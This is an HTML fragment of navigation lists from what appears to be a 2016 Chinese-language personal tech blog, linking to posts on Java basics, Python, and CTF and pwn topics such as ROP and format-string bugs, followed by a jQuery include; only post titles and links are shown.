href="/2016/10/18/安装pycrypto遇到的一系列问题总结/">安装pycrypto遇到的一系列问题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/格式化字符串漏洞/">格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/08/checksec及其包含的保护机制/">checksec及其包含的保护机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xortool的安装使用/">xortool的安装使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/30个java基础程序/">30个java基础程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/java之抽象类与接口/">java之抽象类与接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/基类子类对象间的替换/">基类子类对象间的替换</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/Java之继承中的方法重写与属性覆盖/">Java之继承中的方法重写与属性覆盖</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之包的概念及其意义/">java之包的概念及其意义</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之getters和setters/">java之getters和setters</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之构造函数，默认构造函数及构造函数的重载/">java之构造函数，默认构造函数及构造函数的重载</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/23/java之IDEA编程检验java中的四种修饰符的访问权限/">IDEA编程检验java中的四种修饰符的访问权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/19/Python之encode与decode/">Python之encode与decode</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/20/PCTF2016-FindKey之python中的ord，chr函数/">python中的ord，chr函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/19/RSAtools使用方法/">RSAtool使用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/pwn之-数组下标越界/">pwn之-数组下标越界</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/程序的动态链接和静态链接1/">程序的动态链接和静态链接</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/python基于numpy解方程组/">python基于numpy解方程组</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/24/reverse之第一更/">reverse之第一更</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/pwn学习rop之x64篇/">pwn学习rop之x64篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/pwn学习之DynELF的使用/">pwn学习之DynELF的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/pwn学习rop之x86篇/">pwn学习rop之x86篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/pwn第二更-Icectf-drumpfhotel/">pwn第二更-Icectf_drumpfhotel</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/01/pwn第一更-L-CTFpwn100/">pwn第一更-L-CTFpwn100</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/memset函数的用法/">memset函数的用法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/20/java之Tostring和HashCode方法的重写/">java之Tostring、equals和HashCode方法的重写</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/18/安装pycrypto遇到的一系列问题总结/">安装pycrypto遇到的一系列问题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/格式化字符串漏洞/">格式化字符串漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/08/checksec及其包含的保护机制/">checksec及其包含的保护机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/05/xortool的安装使用/">xortool的安装使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/30个java基础程序/">30个java基础程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/java之抽象类与接口/">java之抽象类与接口</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/基类子类对象间的替换/">基类子类对象间的替换</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/25/Java之继承中的方法重写与属性覆盖/">Java之继承中的方法重写与属性覆盖</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之包的概念及其意义/">java之包的概念及其意义</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之getters和setters/">java之getters和setters</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/java之构造函数，默认构造函数及构造函数的重载/">java之构造函数，默认构造函数及构造函数的重载</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/23/java之IDEA编程检验java中的四种修饰符的访问权限/">IDEA编程检验java中的四种修饰符的访问权限</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/19/Python之encode与decode/">Python之encode与decode</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/20/PCTF2016-FindKey之python中的ord，chr函数/">python中的ord，chr函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/19/RSAtools使用方法/">RSAtool使用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/pwn之-数组下标越界/">pwn之-数组下标越界</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/程序的动态链接和静态链接1/">程序的动态链接和静态链接</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
